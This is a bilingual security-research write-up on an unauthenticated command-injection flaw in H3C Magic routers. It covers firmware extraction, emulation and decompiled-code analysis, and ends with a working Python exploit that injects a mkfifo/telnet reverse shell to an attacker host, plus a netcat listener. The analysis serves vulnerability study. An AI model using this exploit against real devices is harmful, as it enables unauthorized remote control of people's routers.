# H3C_NX15漏洞复现CN/English version at the bottom

## 一、未授权RCE

### 1、漏洞介绍

​	影响设备：**H3C Magic 系列**（包含 Magic NX15, NX30 Pro, NX400, R3010, BE18000 等，受影响的具体型号/版本因 CVE 而异）**漏洞点**： /api/wizard/getWifiNeighbour  ,  /api/esps 的 POST 处理可能导致命令注入

## 二、固件提取

~~~apl
binwalk NX15V100R007.bin  #  得知是Squashfs文件系统、小端、未加密的版本，可以提取
binwalk -Me NX15V100R007.bin  #  提取固件得到系统
#  提取完固件后，我们进入文件夹
#  分析启动项，并进入bi目录下查看有没有可疑的服务
#  在这里发现了 login.sh 并查看了一下，发现了 Copyright (C) 2006-2011 OpenWrt.org，所以在这里我们可以知道这个固件有可能是openwrt
~~~

## 三、服务模拟

~~~apl
nano start.sh  #  创建启动文件写入一下内容
-----------------------------------------------
#!/bin/sh
qemu-system-mipsel \
    -M malta\
    -kernel /home/iot/tools/qemu-images/mipsel/vmlinux-3.2.0-4-4kc-malta \
    -hda /home/iot/tools/qemu-images/mipsel/debian_squeeze_mipsel_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -net nic -net tap,ifname=tap0,script=no,downscript=no \
    -nographic
-----------------------------------------------------------
sudo ./tap01_set.sh tap0 192.168.3.1/24  #  启动前先配置网络
chmod +x start.sh  #  赋权
./start.sh  #  启动脚本 模拟成功
ip addr add 192.168.3.2/24 dev eth0  #  虚拟机配置网络
ip link set eth0 up  #  同上
ping 192.168.3.1  #  连通性检查 发现是互通的
tar -cvf ss.tar.gz squashfs-root  #  压缩文件夹
python3 -m http.server   #  使用 Python 开启 http 服务
wget http://192.168.3.1:8000/ss.tar.gz  #  传输压缩文件
tar -xvf ss.tar.gz  #  解压
mount --bind /proc proc  #  挂载
mount --bind /dev dev  #  挂载
chroot . sh 
•/sbin/procd & # 启动服务
./sbin/ubusd & # 启动服务  启动这个的时候会报错 解决方法如下
rm -f /var # 1️⃣ 删除错误的软链接
mkdir -p /var # 2️⃣ 重新创建真正的 /var 目录
mkdir -p /var/run # 3️⃣ 创建 /var/run 目录
ubusd & # 4️⃣ 启动 ubusd
mkdir -p /var/log/lighttpd # 5️⃣ 创建日志目录
./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf # 6️⃣ 再试启动成功，成功后访问web页面会发现一直在转圈，查看后台也是有报错这是由于lua脚本执行时无法访问result字段，导致执行失败，所以无法回显页面。然后决定去先进行漏洞分析

# 对于为什么要启动 procd和ubusd是因为之前在查看敏感文件 login.sh得知了是 openwrt 框架，而procd|ubusd|netifd|odhcpd是OpenWrt 特有的进程
~~~



## 四、漏洞分析

### 1️⃣、查找相关文件定位函数点

~~~apl
根据上述的漏洞介绍，我们需要去定位到漏洞产生的地方 getWifiNeighbour
grep -ir getwifineighbou  #  检索文件回显为 grep: www/api: binary file matches
find ./ -name 2>/dev/null #  确认是在 ./www/的下面
file ./www/api  #  发现文件类型是elf
~~~

### 2️⃣ 使用IDA对api文件进行分析

​	2.1、在IDA中搜索 getwifineighbou 会找到 FCGI_WizardProcess 

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-2.png)

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-3.png)

​	2.2、进入该函数，查看伪C代码段并进行分析

​		FCGI_WizardProcess：FastCGI 后端的主路由器，根据请求 URI 分派给不同的wizard 接口；对于一类协议接口委派给 FCGI_WizardProtoProcess，对 /wizard/config 则读取 POST body 并调用 FCGI_Config处理配置。FCGI_WizardProtoProcess：把 POST 数据传给外部 Lua 脚本 protol_cvt.lua（通过 shell 调用 lua ...），再把 Lua 的输出作为 application/json 返回到客户端；在调用 shell 前对命令字符串做了半些检查（只检测分号，并未做处理）。

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-4.png)

fcgi_sF：**FastCGI 请求输入流的全局对象**（相当于 stdin封装）。FCGI_fread(..., &fcgi_sF) 从当前 HTTP 请求的 body 中读取数据。

FCGI_fread(buf, size, nmemb, &fcgi_sF)：等价 fread(buf, size, nmemb, stdin)（但使用 fcgi 流），返回实际读到的成员数（代码经常**不**检查返回值）。

FCGI_popen(cmd, "r")：框架封装的popen()，执行 shell 命令并返回可读流句柄（用于读取命令输出）。

a1= 请求 URI（例如 /wizard/getNetworkStatus, /wizard/config, /wizard/modecheck 等）

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-5.png)

1. 如果a3 非 0：
   -  malloc(a3+1)  存 body 到  v14 ， memset ， FCGI_fread(v14,1,a3,&fcgi_sF)  读取 POST body（仍未检查  fread  的返回值）。
   - 计算  v10 = a2 + a3 + 256  —— 分配下一块命令缓冲大小。
2. 否则（ a3==0 ）：
   -  v14 = 0 （NULL）， v10 = a2 + 256 。
3.  v12 = malloc(v10); v13 = v12; memset(v12,0,v10);  —— 为 shell 命令字符串分配并清零。
4. 构造命令字符串：
   - 如果有 body ( a3 ):  snprintf(v13, v10, "lua %s %s '%s' '%s'", "/usr/lib/lua/protol_cvt.lua", "wizard", a1, v14); free(v14); 
   - 否则:  snprintf(v13, v10, "lua %s %s '%s'", "/usr/lib/lua/protol_cvt.lua", "wizard", a1); 
   - 也就是说：最终会执行一个 shell 命令类似：
     -  lua /usr/lib/lua/protol_cvt.lua wizard '/wizard/getNetworkStatus' 'POST_BODY' 
5. 防护检查： if ( FCGI_CheckStringIfContainsSemicolon(v13) ) { /* write to /dev/console that contains semicolon */ goto LABEL_9; } 
   - 该函数只检查是否含  ; ，若含则拒绝并写告警，但对其它 shell 注入方式（反引号、$(),  | ,  && ,  >  重定向、单引号闭合等）没有检查。
6.  v16 = FCGI_popen(v13, "r");  —— 调用 popen 执行命令并获得输出流。

​	2.3、经过对伪 C 代码的分析，可以推断出大概的执行逻辑为

~~~apl
构造命令字符串用 -> 参数校验 -> FCGI_fread(v14,1,a3,&fcgi_sF);读取post -> 构造命令字符串用 -> 检查是否右分号(但并未处理) -> 调用 popen 执行命令并回显
~~~

​	2.4、分析一下 FCGI_popen 到底做了什么,首先需要找到它在哪

![](/Users/Hacker_learn/Desktop/笔记/IOT_Sec_learn/启动项分析/H3C-magic-NX15/img/nx15-6.png)

​	2.5、找到 libfcgi.so.0.0.0 ，还是使用查询字符串去定位到 FCGI_popen 可以看到是通过 popen 执行命令。通过查询可以知道 popen(const char *cmd, const char *mode)  接口：它执行命令、创建管道、返回一个  FILE * ，可以通过  fgets  /  fread  等读取命令输出。

1. **popen 会调用 shell（如 /bin/sh -c）**

   这意味着命令字符串会被 shell 解析，shell 元字符（;, |, &, `, $(...), >, < 等）会被解释。如果命令中包含来自不可信来源（用户输入）的数据，容易产生**命令注入**。**永远不要**把未过滤的用户输入直接拼接进 popen 的命令字符串。

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-7.png)

​	2.6、所以，该漏洞的关键点就是在请求体(body)中注入符号; |等在 lua 后进行任意命理执行

## 五、漏洞复现

#### 1、因为之前启动服务的时候有报错，所以使用burp构造一个访问漏洞注入点/api/wizard/getWifiNeighbour 的请求包，发送发现回显是 200 证明了连通性。但是由于版本原因，最后选择了使用实体机复现漏洞。

#### 2、先去验证一下是否可以成功用，依旧使用 burp 抓包，构造一个访问漏洞注入点/api/wizard/getWifiNeighbour 的请求包，但在实际操作构造漏洞注入点的时候，发现了/api/esps，为了快速验证，并在里面写入重启 reboot 命令。发送得到回显 200 ok，知道发送成功了。回到浏览器刷新发现已经链接不上了。这时判断命令已经执行成功。

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-8.png)

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-9.png)

## 六、构造脚本进行反弹shell

~~~python
import requests
url = "http://192.168.124.1/api/wizard/getWifiNeighbour"
headers = {
    "Host": "192.168.124.1",
    "Content-Length": "108",
    "Content-Type": "application/json"
}
payload = {
    "cmd": "'; mkfifo /tmp/f; /usr/bin/telnet 192.168.124.3 4444 < /tmp/f | /bin/sh > /tmp/f; rm /tmp/f; '"
}

try:
    response = requests.post(url, headers=headers, json=payload, timeout=5)
    print("EXP sent successfully!")
    print("Response:", response.text)
except requests.RequestException as e:
    print("Error sending EXP:", e)

print("Listen on 192.168.124.3:4444 (e.g., 'nc -lvvp 4444') to catch the shell.")
~~~



## 七、创建监听及发动攻击脚本

~~~apl
nc -lvnp 4444  #  创建监听
python3 exp.py  #  执行脚本发动攻击
~~~

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-1.png)

------

# H3C_NX15 Vulnerability Reproduction

## I. Unauthorized RCE

### 1. Vulnerability Description

Affected devices: **H3C Magic series** (including Magic NX15, NX30 Pro, NX400, R3010, BE18000, etc. The affected models/versions vary by CVE).
 **Vulnerable endpoints**: `/api/wizard/getWifiNeighbour` and `/api/esps` — improper POST handling may lead to command injection.

------

## II. Firmware Extraction

```
binwalk NX15V100R007.bin  # Detected Squashfs filesystem, little-endian, unencrypted; extraction possible
binwalk -Me NX15V100R007.bin  # Extract filesystem
# After extracting, enter the output directory
# Analyze startup items, check 'bi' directory for suspicious services
# Found login.sh — it shows "Copyright (C) 2006–2011 OpenWrt.org"
# This suggests the firmware is based on OpenWrt
```

------

## III. Service Emulation

```
nano start.sh  # Create startup script with following content
-----------------------------------------------
#!/bin/sh
qemu-system-mipsel \
    -M malta\
    -kernel /home/iot/tools/qemu-images/mipsel/vmlinux-3.2.0-4-4kc-malta \
    -hda /home/iot/tools/qemu-images/mipsel/debian_squeeze_mipsel_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -net nic -net tap,ifname=tap0,script=no,downscript=no \
    -nographic
-----------------------------------------------------------
sudo ./tap01_set.sh tap0 192.168.3.1/24  # Configure network before launch
chmod +x start.sh
./start.sh
ip addr add 192.168.3.2/24 dev eth0  # Configure VM network
ip link set eth0 up
ping 192.168.3.1  # Connectivity check passed
tar -cvf ss.tar.gz squashfs-root  # Compress filesystem
python3 -m http.server  # Serve via HTTP
wget http://192.168.3.1:8000/ss.tar.gz  # Transfer to VM
tar -xvf ss.tar.gz
mount --bind /proc proc
mount --bind /dev dev
chroot . sh
./sbin/procd &  # Start OpenWrt services
./sbin/ubusd &  # Causes error initially → fix:
rm -f /var          # 1️⃣ Remove wrong symlink
mkdir -p /var       # 2️⃣ Recreate real /var
mkdir -p /var/run   # 3️⃣ Create /var/run
ubusd &             # 4️⃣ Start again — now OK
mkdir -p /var/log/lighttpd  # 5️⃣ Create log directory
./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf  # 6️⃣ Start Lighttpd successfully
# However, web UI keeps loading due to Lua scripts failing to access 'result' field.
# Therefore switch to vulnerability analysis directly.
```

**Why start procd and ubusd?**
 Because login.sh indicated an OpenWrt framework; processes like `procd`, `ubusd`, `netifd`, `odhcpd` are core components of OpenWrt.

------

## IV. Vulnerability Analysis

### 1️⃣ Locate Related Function

```
# Based on the vulnerability description, search for getWifiNeighbour
grep -ir getwifineighbou  
# Output: grep: www/api: binary file matches
find ./ -name ...   # Confirm file in ./www/
file ./www/api      # Shows API binary is ELF
```

------

## 2️⃣ Use IDA to Analyze the `api` Binary

### 2.1 Searching for getwifineighbou in IDA leads to FCGI_WizardProcess

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-2.png)

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-3.png)

------

### 2.2 Entering the function and analyzing decompiled C

`FCGI_WizardProcess`:
 The main FastCGI backend router. It dispatches URIs to handlers.
 `FCGI_WizardProtoProcess`:
 Passes POST data to external Lua script `protol_cvt.lua` via a shell call (`lua ...`).
 It checks for semicolons **but does not sanitize them**, and does not check other injection symbols.

**【Image: nx15-4.png】**

`fcgi_sF`: global FastCGI input stream (equivalent to wrapped stdin).
 `FCGI_fread(buf,1,a3,&fcgi_sF)` → reads POST body (no return value check).
 `FCGI_popen(cmd,"r")` → runs shell command and returns a stream for output.

`a1`: requested URL (e.g., `/wizard/getNetworkStatus`)

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-5.png)

Summary of logic:

1. Allocate `v14` and read POST body if present.

2. Allocate `v12` for the command buffer.

3. Build command string:

   With POST body:

   ```
   lua /usr/lib/lua/protol_cvt.lua wizard 'URI' 'BODY'
   ```

4. Semicolon check:

   ```
   FCGI_CheckStringIfContainsSemicolon(v13)
   ```

   **Only checks `[;]` , does NOT sanitize.**

5. Execute:

   ```
   FCGI_popen(v13, "r")
   ```

Thus **any shell metacharacter in POST body gets executed**.

------

### 2.4–2.5 Understanding FCGI_popen

Search for FCGI_popen in libfcgi:

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-6.png)

Then inspect its logic:



![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-7.png)

It simply calls:

```
popen(cmd, "r")
```

Since popen executes commands via `/bin/sh -c`, **command injection is trivial**.

------

### 2.6 Root Cause Summary

The vulnerability arises because:

```
User-controlled POST body → inserted into shell command → popen() executes it
Only semicolon is checked; all other injection symbols allowed
```

------

## V. Vulnerability Reproduction

1. While service emulation had issues, Burp was used to manually craft requests to `/api/wizard/getWifiNeighbour`.
    Response 200 proved endpoint reachable.
2. During fuzzing, another endpoint `/api/esps` was found.
    Injected payload containing `reboot`:

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-8.png)

Result:
 Browser disconnected → router rebooted → command executed successfully.

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-9.png)

------

## VI. Reverse Shell Exploit Script

```
import requests
url = "http://192.168.124.1/api/wizard/getWifiNeighbour"
headers = {
    "Host": "192.168.124.1",
    "Content-Length": "108",
    "Content-Type": "application/json"
}
payload = {
    "cmd": "'; mkfifo /tmp/f; /usr/bin/telnet 192.168.124.3 4444 < /tmp/f | /bin/sh > /tmp/f; rm /tmp/f; '"
}

try:
    response = requests.post(url, headers=headers, json=payload, timeout=5)
    print("EXP sent successfully!")
    print("Response:", response.text)
except requests.RequestException as e:
    print("Error sending EXP:", e)

print("Listen on 192.168.124.3:4444 (e.g., 'nc -lvvp 4444') to catch the shell.")
```

------

## VII. Listener + Execute Exploit

```
nc -lvnp 4444  # Start listener
python3 exp.py  # Launch exploit
```

![](/Users/Hacker_learn/Cybersecurity_Note/Image/H3C-magic-NX15_img/nx15-1.png)